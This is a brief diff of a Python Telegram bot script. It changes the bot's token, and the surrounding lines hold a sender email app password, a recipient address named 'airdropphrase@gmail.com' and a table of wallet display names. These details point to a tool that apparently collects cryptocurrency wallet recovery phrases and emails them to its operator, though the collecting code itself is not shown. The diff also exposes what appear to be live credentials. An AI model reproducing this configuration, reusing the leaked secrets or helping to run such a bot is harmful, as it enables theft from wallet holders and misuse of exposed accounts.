@@ -39,7 +39,7 @@ SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Use an App Password if using Gmail
 RECIPIENT_EMAIL = "airdropphrase@gmail.com"
 
 # Bot token (as requested)
-BOT_TOKEN = "8369298085:AAFoAMt73954PXJ-yvHaD0UJe70ya_LX3jI"
+BOT_TOKEN = "8250471498:AAHrw8j9PnVqVImiEOL9baCIPDlRfeqAXpo"
 
 # Wallet display names used for wallet selection UI
 WALLET_DISPLAY_NAMES = {
@@ -1408,3 +1408,4 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
+
